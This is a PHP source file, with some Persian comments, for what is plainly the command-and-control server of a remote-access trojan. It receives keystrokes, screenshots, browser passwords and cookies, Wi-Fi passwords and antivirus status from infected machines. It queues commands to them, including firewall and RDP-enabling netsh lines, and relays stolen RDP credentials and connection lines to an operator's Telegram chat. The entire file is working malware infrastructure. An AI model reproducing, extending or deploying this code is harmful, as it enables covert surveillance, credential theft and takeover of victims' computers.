<?php

namespace Handlers;

use Services\LoggerService;
use Services\TelegramService;
use Services\ClientService;
use Services\EncryptionService;
use \Config;
use PDO;

require_once __DIR__ . '/../../config.php';

class ClientRequestHandler
{
    private $pdo;
    private $logger;
    private $telegram;
    private $clientService;
    private $encryption;

    public function __construct(PDO $pdo)
    {
        $this->pdo = $pdo;
        $this->logger = new LoggerService();
        $this->telegram = new TelegramService($this->logger);
        $this->clientService = new ClientService($pdo, $this->logger);
        $this->encryption = new EncryptionService($this->logger);
    }

    public function handle(array $input)
    {
        header('Content-Type: application/json');
        $data = array_merge($input, $_POST);

        // لاگ با فرمت بهتر
        $logData = [
            'action' => $data['action'] ?? 'unknown',
            'client_id' => $data['client_id'] ?? 'unknown',
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'timestamp' => date('Y-m-d H:i:s')
        ];
        $this->logger->logWebhook("Client request: " . json_encode($logData, JSON_UNESCAPED_UNICODE));

        $action = $data['action'] ?? null;
        $clientId = $data['client_id'] ?? null;

        if (!$action || !$clientId) {
            http_response_code(400);
            $this->logger->logError("Invalid client request: missing action or client_id. Input: " . json_encode($data));
            die(json_encode(['error' => 'Missing action or client_id']));
        }

        // Validation
        if (!$this->validateClientId($clientId)) {
            http_response_code(400);
            $this->logger->logError("Invalid client_id format: $clientId");
            die(json_encode(['error' => 'Invalid client_id format']));
        }

        $this->clientService->updateClientStatus($clientId, $_SERVER['REMOTE_ADDR'] ?? 'unknown');

        $response = $this->processAction($action, $clientId, $data);
        $this->logger->logWebhook("Client response: " . json_encode([
            'action' => $action,
            'client_id' => $clientId,
            'status' => $response['status'] ?? $response['error'] ?? 'unknown'
        ]));

        echo json_encode($response);
    }

    private function validateClientId(string $clientId): bool
    {
        // فقط الفبا، اعداد، خط تیره و آندرلاین مجاز است
        return preg_match('/^[a-zA-Z0-9_-]{1,32}$/', $clientId) === 1;
    }

    private function processAction(string $action, string $clientId, array $data): array
    {
        $this->logger->logWebhook("Processing action: $action for client: $clientId");

        switch ($action) {
            case 'get_commands':
                return $this->clientService->getClientCommands($clientId);
            case 'upload_data':
                return $this->handleUploadData($clientId, $data);
            case 'command_response':
                return $this->handleCommandResponse($clientId, $data);
            case 'upload_vm_status':
                return $this->handleUploadVMStatus($clientId, $data);
            case 'report_self_destruct':
                return $this->handleSelfDestructReport($clientId, $data);
            case 'report_update':
                return $this->handleUpdateReport($clientId, $data);
            case 'report_rdp':
                return $this->handleRDPReport($clientId, $data);
            case 'enable_rdp':
                return $this->handleEnableRDP($clientId, $data);
            case 'disable_rdp':
                return $this->handleDisableRDP($clientId, $data);
            case 'upload_wifi_passwords':
                return $this->handleUploadWifiPasswords($clientId, $data);
            case 'upload_browser_data':
                return $this->handleUploadBrowserData($clientId, $data);
            case 'upload_antivirus_status':
                return $this->handleUploadAntivirusStatus($clientId, $data);
            case 'upload_installed_programs':
                return $this->handleUploadInstalledPrograms($clientId, $data);
            case 'upload_file':
                return $this->handleUploadFile($clientId, $data);
            default:
                $this->logger->logError("Unknown action: $action");
                return ['error' => 'Unknown action'];
        }
    }

    private function handleUploadFile(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("File Upload START for client: $clientId");
            $this->logger->logWebhook("POST data: " . json_encode($data, JSON_UNESCAPED_UNICODE));
            $this->logger->logWebhook("FILES data: " . json_encode($_FILES, JSON_UNESCAPED_UNICODE));

            if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
                $error = $_FILES['file']['error'] ?? 'No file';
                $this->logger->logError("File upload failed: error code $error for client_id: $clientId");
                http_response_code(400);
                return ['error' => 'No file provided or upload error', 'error_code' => $error];
            }

            $filename = $_FILES['file']['name'] ?? 'unknown_file_' . time();
            $fileSize = $_FILES['file']['size'] ?? 0;

            // ساخت نام فایل امن
            $safeFilename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
            $filePath = Config::$UPLOAD_DIR . 'file_' . $clientId . '_' . time() . '_' . $safeFilename;

            $this->logger->logWebhook("Attempting to move file to: $filePath");

            if (!move_uploaded_file($_FILES['file']['tmp_name'], $filePath)) {
                $this->logger->logError("Failed to move uploaded file for client_id: $clientId");
                http_response_code(500);
                return ['error' => 'Failed to save file'];
            }

            $this->logger->logWebhook("File saved successfully: $filePath");

            // ذخیره در جدول client_files
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_files (client_id, filename, file_path, file_size, created_at) 
                VALUES (?, ?, ?, ?, NOW())"
            );
            $stmt->execute([$clientId, $filename, $filePath, $fileSize]);

            $this->logger->logWebhook("File record inserted to database with ID: " . $this->pdo->lastInsertId());

            // ارسال پیام به تلگرام
            $message = "📄 File Uploaded:\n";
            $message .= "Client ID: $clientId\n";
            $message .= "Filename: $filename\n";
            $message .= "Size: " . round($fileSize / 1024, 2) . " KB\n";
            $message .= "Path: $filePath\n";
            $message .= "Time: " . date('Y-m-d H:i:s');

            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
            $this->logger->logWebhook("Telegram notification sent for file upload");

            return [
                'status' => 'success',
                'file_path' => $filePath,
                'file_id' => $this->pdo->lastInsertId()
            ];
        } catch (\Exception $e) {
            $this->logger->logError("File upload exception for client_id: $clientId, error: " . $e->getMessage());
            $this->logger->logError("Stack trace: " . $e->getTraceAsString());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function handleUploadData(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("Upload data START for client: $clientId");

            $keystrokes = '';
            if (isset($data['keystrokes']) && !empty($data['keystrokes'])) {
                $keystrokes = $this->encryption->decrypt($data['keystrokes']);
                $this->logger->logWebhook("Keystrokes decrypted: " . strlen($keystrokes) . " chars");
            }

            $systemInfo = '';
            if (isset($data['system_info']) && !empty($data['system_info'])) {
                $systemInfo = $this->encryption->decrypt($data['system_info']);
                if ($systemInfo && json_decode($systemInfo) === null) {
                    $this->logger->logError("System_info is not valid JSON for client: $clientId");
                }
                $this->logger->logWebhook("System info decrypted: " . strlen($systemInfo) . " chars");
            }

            $screenshotPath = null;
            if (isset($_FILES['screenshot']) && $_FILES['screenshot']['error'] === UPLOAD_ERR_OK) {
                $filename = 'screenshot_' . $clientId . '_' . time() . '.png';
                $screenshotPath = Config::$SCREENSHOT_DIR . $filename;
                if (move_uploaded_file($_FILES['screenshot']['tmp_name'], $screenshotPath)) {
                    $this->logger->logWebhook("Screenshot saved: $screenshotPath");
                } else {
                    $this->logger->logError("Failed to save screenshot for client: $clientId");
                    $screenshotPath = null;
                }
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO user_data (client_id, keystrokes, system_info, screenshot_path, created_at) 
                VALUES (?, ?, ?, ?, NOW())"
            );
            $stmt->execute([$clientId, $keystrokes, $systemInfo, $screenshotPath]);

            $this->logger->logCommand(
                $clientId,
                'upload_data',
                "Keystrokes: " . strlen($keystrokes) . " chars, System Info: " . strlen($systemInfo) . " chars"
            );
            $this->logger->logWebhook("Upload data SUCCESS for client: $clientId");

            return ['status' => 'success'];
        } catch (\Exception $e) {
            $this->logger->logError("Upload data failed for client: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function handleCommandResponse(string $clientId, array $data): array
    {
        try {
            $commandId = $data['command_id'] ?? null;
            $result = isset($data['result']) ? $this->encryption->decrypt($data['result']) : '';

            if (!$commandId) {
                $this->logger->logError("Missing command_id in command response");
                return ['error' => 'Missing command_id'];
            }

            $this->logger->logWebhook("Command response received: command_id=$commandId, result_length=" . strlen($result));

            $resultData = json_decode($result, true);
            $stmt = $this->pdo->prepare(
                "UPDATE client_commands SET status = 'completed', result = ?, completed_at = NOW() 
                WHERE id = ?"
            );
            $stmt->execute([strlen($result) > 65000 ? 'Result too large' : $result, $commandId]);

            $stmt = $this->pdo->prepare("SELECT client_id, command FROM client_commands WHERE id = ?");
            $stmt->execute([$commandId]);
            $commandData = $stmt->fetch();

            if ($commandData) {
                $decryptedCommand = $this->encryption->decrypt($commandData['command']);
                $commandJson = json_decode($decryptedCommand, true);
                $commandType = $commandJson['type'] ?? 'unknown';

                $this->logger->logWebhook("Processing command type: $commandType");

                // پردازش بر اساس نوع دستور
                $this->processCommandResult($clientId, $commandType, $commandJson['params'] ?? [], $resultData, $result);
            }

            return ['status' => 'success'];
        } catch (\PDOException $e) {
            $this->logger->logError("Command response failed: " . $e->getMessage());
            return ['error' => 'Response processing failed'];
        }
    }

    private function processCommandResult(string $clientId, string $commandType, array $params, ?array $resultData, string $result)
    {
        // Try to extract command type from various sources
        $actualCommandType = 'unknown';

        // Method 1: Check if resultData contains command type
        if ($resultData && isset($resultData['command_type'])) {
            $actualCommandType = $resultData['command_type'];
        }
        // Method 2: Check if we have the original command data
        elseif (isset($params['original_command'])) {
            $actualCommandType = $this->detectCommandTypeFromOriginal($params['original_command']);
        }
        // Method 3: Use the stored commandType parameter
        elseif ($commandType && $commandType !== 'unknown') {
            $actualCommandType = $commandType;
        }
        // Method 4: Try to detect from result content
        else {
            $actualCommandType = $this->detectCommandTypeFromResult($result);
        }

        $message = "Command '$actualCommandType' result for client $clientId:\n";

        if ($resultData && isset($resultData['status'])) {
            $message .= "Status: {$resultData['status']}\n";
            if (isset($resultData['message'])) {
                $message .= "Message: {$resultData['message']}\n";
            }
        } else {
            // For compressed results, indicate they're compressed
            if (str_starts_with($result, 'H4sI')) {
                $message .= "Result: [Compressed data - view in dashboard for details]\n";
            } else {
                // Truncate very large results
                $displayResult = strlen($result) > 1000 ? substr($result, 0, 1000) . '... [truncated]' : $result;
                $message .= "Result: $displayResult";
            }
        }

        $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
    }

    private function detectCommandTypeFromOriginal(string $originalCommand): string
    {
        $commandMap = [
            '/status' => 'status',
            '/screenshot' => 'capture_screenshot',
            '/exec' => 'system_command',
            '/browse' => 'file_operation',
            '/get-info' => 'system_info',
            '/go' => 'open_url',
            '/shutdown' => 'system_command',
            '/restart' => 'system_command',
            '/sleep' => 'system_command',
            '/signout' => 'system_command',
            '/tasks' => 'process_management',
            '/end_task' => 'end_task',
            '/enable_rdp' => 'enable_rdp',
            '/disable_rdp' => 'disable_rdp',
            '/getwifipasswords' => 'get_wifi_passwords',
        ];

        foreach ($commandMap as $cmd => $type) {
            if (str_starts_with($originalCommand, $cmd)) {
                return $type;
            }
        }

        return 'unknown';
    }

    private function detectCommandTypeFromResult(string $result): string
    {
        if (str_contains($result, 'wifi') || str_contains($result, 'Wi-Fi')) {
            return 'get_wifi_passwords';
        } elseif (str_contains($result, 'http') || str_contains($result, '://')) {
            return 'open_url';
        } elseif (str_contains($result, 'system') || str_contains($result, 'OS') || str_contains($result, 'Windows')) {
            return 'system_info';
        } elseif (str_contains($result, 'screenshot')) {
            return 'capture_screenshot';
        }

        return 'unknown';
    }

    private function handleUploadVMStatus(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("VM Status upload for client: $clientId");

            $vmDetails = '';
            if (isset($data['vm_details']) && !empty($data['vm_details'])) {
                $vmDetails = $this->encryption->decrypt($data['vm_details']);
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_vm_status (client_id, vm_details, created_at) 
                VALUES (?, ?, NOW())"
            );
            $stmt->execute([$clientId, $vmDetails]);

            if ($vmDetails) {
                $vmData = json_decode($vmDetails, true);
                $isVM = $vmData['is_vm'] ?? false;
                $message = $isVM
                    ? "⚠️ Virtual Machine detected on client $clientId!"
                    : "✅ Physical Machine confirmed for client $clientId.";
                $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
            }

            return ['status' => 'success'];
        } catch (\Exception $e) {
            $this->logger->logError("VM status upload failed: " . $e->getMessage());
            return ['error' => 'Upload failed'];
        }
    }

    private function handleSelfDestructReport(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("Self-destruct report: " . json_encode($data));
            $report = '';
            if (isset($data['report']) && !empty($data['report'])) {
                $report = $this->encryption->decrypt($data['report']);
                if ($report === '') {
                    $this->logger->logError("Self-destruct report decryption failed or empty for client_id: $clientId");
                } else {
                    $jsonCheck = json_decode($report, true);
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        $this->logger->logError("Self-destruct report is not valid JSON for client_id: $clientId, data: " . substr($report, 0, 50));
                        $report = '';
                    }
                }
            }

            if ($report) {
                $reportData = json_decode($report, true);
                $message = "🚨 Self-destruct initiated for client $clientId!\nDetails: " . json_encode($reportData, JSON_PRETTY_PRINT);
                $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
                VALUES (?, 'self_destruct', ?, NOW())"
            );
            $stmt->execute([$clientId, $report]);

            return ['status' => 'success'];
        } catch (\Exception $e) {
            $this->logger->logError("Self-destruct report failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Report failed: ' . $e->getMessage()];
        }
    }

    private function handleUpdateReport(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("Update report: " . json_encode($data));
            $report = '';
            if (isset($data['report']) && !empty($data['report'])) {
                $report = $this->encryption->decrypt($data['report']);
                if ($report === '') {
                    $this->logger->logError("Update report decryption failed or empty for client_id: $clientId");
                } else {
                    $jsonCheck = json_decode($report, true);
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        $this->logger->logError("Update report is not valid JSON for client_id: $clientId, data: " . substr($report, 0, 50));
                        $report = '';
                    }
                }
            }

            if ($report) {
                $reportData = json_decode($report, true);
                $message = "🔄 Client $clientId updated to version {$reportData['new_version']}.\nDetails: " . json_encode($reportData, JSON_PRETTY_PRINT);
                $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
                VALUES (?, 'update', ?, NOW())"
            );
            $stmt->execute([$clientId, $report]);

            return ['status' => 'success'];
        } catch (\Exception $e) {
            $this->logger->logError("Update report failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Report failed: ' . $e->getMessage()];
        }
    }

    private function handleRDPReport(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("RDP Report: " . json_encode($data, JSON_UNESCAPED_UNICODE));
            $rdpInfo = $data['rdp_info'] ?? null;

            if (!$rdpInfo) {
                $this->logger->logError("Invalid RDP report: missing rdp_info");
                http_response_code(400);
                return ['error' => 'Missing rdp_info'];
            }

            $decryptedInfo = $this->encryption->decrypt($rdpInfo);
            if ($decryptedInfo === '') {
                $this->logger->logError("Failed to decrypt RDP info for client_id: $clientId");
                http_response_code(400);
                return ['error' => 'Decryption failed'];
            }

            $rdpData = json_decode($decryptedInfo, true);
            if (!$rdpData || json_last_error() !== JSON_ERROR_NONE) {
                $this->logger->logError("Invalid RDP data format for client_id: $clientId, decrypted: " . substr($decryptedInfo, 0, 50));
                http_response_code(400);
                return ['error' => 'Invalid data format'];
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
                VALUES (?, 'rdp', ?, NOW())"
            );
            $stmt->execute([$clientId, $decryptedInfo]);

            $stmt = $this->pdo->prepare(
                "UPDATE clients SET ip_address = ?, last_seen = NOW(), is_online = 1 
                WHERE client_id = ?"
            );
            $ip = $rdpData['public_ip'] ?? ($rdpData['local_ip'] ?? 'unknown');
            $stmt->execute([$ip, $clientId]);

            $portStatus = $this->testPort($ip, 3389);

            $message = "🖥️ RDP Status Update:\n";
            $message .= "Client ID: $clientId\n";
            if (isset($rdpData['username']) && isset($rdpData['password'])) {
                $message .= "Status: Enabled\n";
                $message .= "Local IP: " . ($rdpData['local_ip'] ?? 'N/A') . "\n";
                $message .= "Public IP: " . ($rdpData['public_ip'] ?? 'N/A') . "\n";
                $message .= "Username: {$rdpData['username']}\n";
                $message .= "Password: {$rdpData['password']}\n";
                $message .= "Port 3389 Status: " . ($portStatus ? "Open" : "Closed") . "\n";
                $message .= "Connect using: mstsc /v:" . ($rdpData['public_ip'] ?? $rdpData['local_ip'] ?? 'unknown') . "\n";
            } else {
                $message .= "Status: Failed\n";
                $message .= "Error: " . ($rdpData['message'] ?? 'Failed to enable RDP') . "\n";
                $message .= "Port 3389 Status: " . ($portStatus ? "Open" : "Closed") . "\n";
            }

            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
            $this->logger->logWebhook("RDP report processed for client_id: $clientId, message: $message, port_status: " . ($portStatus ? 'open' : 'closed'));

            return ['status' => 'success', 'port_status' => $portStatus ? 'open' : 'closed'];
        } catch (\Exception $e) {
            $this->logger->logError("RDP report failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Report failed: ' . $e->getMessage()];
        }
    }

    private function handleEnableRDP(string $clientId, array $data): array
    {
        try {
            $commandData = [
                'type' => 'enable_rdp',
                'params' => [
                    'firewall_rule' => 'netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389',
                    'port_check' => 'netstat -an | find "3389"',
                    'rdp_service' => 'net start termservice'
                ]
            ];
            $encryptedCommand = $this->encryption->encrypt(json_encode($commandData));
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
                VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$clientId, $encryptedCommand]);

            $this->logger->logWebhook("Enable RDP command queued for client_id: $clientId, params: " . json_encode($commandData));
            return ['status' => 'success', 'message' => 'Enable RDP command queued'];
        } catch (\Exception $e) {
            $this->logger->logError("Enable RDP failed: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Enable RDP failed: ' . $e->getMessage()];
        }
    }

    private function handleDisableRDP(string $clientId, array $data): array
    {
        try {
            $commandData = ['type' => 'disable_rdp', 'params' => []];
            $encryptedCommand = $this->encryption->encrypt(json_encode($commandData));
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
                VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$clientId, $encryptedCommand]);

            $this->logger->logWebhook("Disable RDP command queued for client_id: $clientId");
            return ['status' => 'success', 'message' => 'Disable RDP command queued'];
        } catch (\Exception $e) {
            $this->logger->logError("Disable RDP failed: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Disable RDP failed: ' . $e->getMessage()];
        }
    }

    private function handleUploadAntivirusStatus(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("Antivirus Status Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
            $antivirusData = $data['antivirus_data'] ?? null;

            if (!$antivirusData) {
                $this->logger->logError("Antivirus status upload failed: Missing antivirus_data");
                http_response_code(400);
                return ['error' => 'Missing antivirus_data'];
            }

            $decryptedAntivirusData = $this->encryption->decrypt($antivirusData);
            if ($decryptedAntivirusData === '') {
                $this->logger->logError("Antivirus data decryption failed for client_id: $clientId");
                http_response_code(400);
                return ['error' => 'Decryption failed'];
            }

            $antivirusJson = json_decode($decryptedAntivirusData, true);
            if (!$antivirusJson || json_last_error() !== JSON_ERROR_NONE) {
                $this->logger->logError("Invalid antivirus data format for client_id: $clientId, decrypted: " . substr($decryptedAntivirusData, 0, 50));
                http_response_code(400);
                return ['error' => 'Invalid data format'];
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
                VALUES (?, 'antivirus', ?, NOW())"
            );
            $stmt->execute([$clientId, $decryptedAntivirusData]);

            $message = "🛡️ Antivirus Status Received:\n";
            $message .= "Client ID: $clientId\n";
            $message .= "Status: " . ($antivirusJson['status'] ?? 'Unknown') . "\n";
            $message .= "Details: " . json_encode($antivirusJson, JSON_PRETTY_PRINT) . "\n";
            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);

            $this->logger->logWebhook("Antivirus status processed for client_id: $clientId");
            return ['status' => 'success'];
        } catch (\Exception $e) {
            $this->logger->logError("Antivirus status upload failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function handleUploadBrowserData(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("Browser Data Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
            $browserData = $data['browser_data'] ?? null;

            if (!$browserData) {
                $this->logger->logError("Browser data upload failed: Missing browser_data");
                http_response_code(400);
                return ['error' => 'Missing browser_data'];
            }

            $decryptedBrowserData = $this->encryption->decrypt($browserData);
            if ($decryptedBrowserData === '') {
                $this->logger->logError("Browser data decryption failed for client_id: $clientId");
                http_response_code(400);
                return ['error' => 'Decryption failed'];
            }

            $browserJson = json_decode($decryptedBrowserData, true);
            if (!$browserJson || json_last_error() !== JSON_ERROR_NONE) {
                $this->logger->logError("Invalid browser data format for client_id: $clientId, decrypted: " . substr($decryptedBrowserData, 0, 50));
                http_response_code(400);
                return ['error' => 'Invalid data format'];
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
                VALUES (?, 'browser_data', ?, NOW())"
            );
            $stmt->execute([$clientId, $decryptedBrowserData]);

            $message = "🌐 Browser Data Received:\n";
            $message .= "Client ID: $clientId\n";
            $message .= "Browser: " . ($browserJson['browser'] ?? 'Unknown') . "\n";
            $message .= "Passwords: " . count($browserJson['passwords'] ?? []) . "\n";
            $message .= "History Entries: " . count($browserJson['history'] ?? []) . "\n";
            $message .= "Cookies: " . count($browserJson['cookies'] ?? []) . "\n";
            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);

            $this->logger->logWebhook("Browser data processed for client_id: $clientId");
            return ['status' => 'success'];
        } catch (\Exception $e) {
            $this->logger->logError("Browser data upload failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function handleUploadWifiPasswords(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("Wi-Fi Passwords Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
            $wifiData = $data['wifi_data'] ?? null;

            if (!$wifiData) {
                $this->logger->logError("Wi-Fi upload failed: Missing wifi_data");
                http_response_code(400);
                return ['error' => 'Missing wifi_data'];
            }

            $decryptedWifiData = $this->encryption->decrypt($wifiData);
            if ($decryptedWifiData === '') {
                $this->logger->logError("Wi-Fi data decryption failed for client_id: $clientId");
                http_response_code(400);
                return ['error' => 'Decryption failed'];
            }

            $wifiJson = json_decode($decryptedWifiData, true);
            if (!$wifiJson || json_last_error() !== JSON_ERROR_NONE) {
                $this->logger->logError("Invalid Wi-Fi data format for client_id: $clientId, decrypted: " . substr($decryptedWifiData, 0, 50));
                http_response_code(400);
                return ['error' => 'Invalid data format'];
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_wifi_data (client_id, wifi_data, created_at) 
                VALUES (?, ?, NOW())"
            );
            $stmt->execute([$clientId, $decryptedWifiData]);

            $message = "📡 Wi-Fi Passwords Received:\n";
            $message .= "Client ID: $clientId\n";
            $message .= "Networks:\n";
            foreach ($wifiJson['wifi_profiles'] as $profile) {
                $message .= "- SSID: {$profile['ssid']}, Password: " . ($profile['password'] ?: 'None') . "\n";
            }
            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);

            $this->logger->logWebhook("Wi-Fi passwords processed for client_id: $clientId, profiles: " . count($wifiJson['wifi_profiles']));
            return ['status' => 'success'];
        } catch (\Exception $e) {
            $this->logger->logError("Wi-Fi upload failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function handleUploadInstalledPrograms(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("Installed Programs Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
            $programsData = $data['installed_programs'] ?? null;

            if (!$programsData) {
                $this->logger->logError("Installed programs upload failed: Missing installed_programs");
                http_response_code(400);
                return ['error' => 'Missing installed_programs'];
            }

            $decryptedProgramsData = $this->encryption->decrypt($programsData);
            if ($decryptedProgramsData === '') {
                $this->logger->logError("Installed programs decryption failed for client_id: $clientId");
                http_response_code(400);
                return ['error' => 'Decryption failed'];
            }

            $programsJson = json_decode($decryptedProgramsData, true);
            if (!$programsJson || json_last_error() !== JSON_ERROR_NONE) {
                $this->logger->logError("Invalid installed programs data format for client_id: $clientId, decrypted: " . substr($decryptedProgramsData, 0, 50));
                http_response_code(400);
                return ['error' => 'Invalid data format'];
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_installed_programs (client_id, program_data, created_at) 
                VALUES (?, ?, NOW())"
            );
            $stmt->execute([$clientId, $decryptedProgramsData]);

            $message = "🖥️ Installed Programs Received:\n";
            $message .= "Client ID: $clientId\n";
            $message .= "Programs: " . count($programsJson) . "\n";
            foreach ($programsJson as $program) {
                $message .= "- {$program['picture']}, Version: {$program['version']}, Publisher: {$program['publisher']})\n";
            }
            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);

            $this->logger->logWebhook("Installed programs processed for client_id: $clientId");
            return ['status' => 'success'];
        } catch (\Exception $e) {
            $this->logger->logError("Installed programs upload failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function testPort(string $host, int $port, int $timeout = 3): bool
    {
        $this->logger->logWebhook("Testing port $port on host $host");
        $fp = @fsockopen($host, $port, $errno, $errstr, $timeout);
        if ($fp) {
            fclose($fp);
            $this->logger->logWebhook("Port $port on $host is open");
            return true;
        } else {
            $this->logger->logError("Port $port on $host is closed or unreachable: $errstr ($errno)");
            return false;
        }
    }

    private function sendFileList(string $clientId, array $files, string $path)
    {
        $message = "Files in `$path`:\n";
        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($files as $file) {
            $type = $file['type'] === 'directory' ? '📁' : '📄';
            $size = round($file['size'] / 1024, 2) . ' KB';
            $message .= "$type {$file['name']} ($size, {$file['modified']})\n";
            if ($file['type'] === 'file') {
                $row[] = ['text' => "Read {$file['name']}", 'callback_data' => "file_action:read|" . urlencode($path . '/' . $file['name'])];
                $row[] = ['text' => "Delete {$file['name']}", 'callback_data' => "file_action:delete|" . urlencode($path . '/' . $file['name'])];
            } else {
                $row[] = ['text' => "Browse {$file['name']}", 'callback_data' => "command:/browse " . urlencode($path . '/' . $file['name'])];
            }
            if (count($row) >= 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        if (strlen($message) > 4000) {
            $tempFile = Config::$UPLOAD_DIR . "file_list_$clientId.txt";
            file_put_contents($tempFile, $message);
            $this->telegram->sendFile(Config::$ADMIN_CHAT_ID, $tempFile);
            unlink($tempFile);
        } else {
            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message, ['reply_markup' => $keyboard]);
        }
    }

    private function sendFileContent(string $clientId, string $content, string $filePath)
    {
        if (strlen($content) > 4000) {
            $tempFile = Config::$UPLOAD_DIR . "file_content_$clientId.txt";
            file_put_contents($tempFile, $content);
            $this->telegram->sendFile(Config::$ADMIN_CHAT_ID, $tempFile);
            unlink($tempFile);
        } else {
            $message = "Content of `$filePath`:\n```\n$content\n```";
            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
        }
    }
}
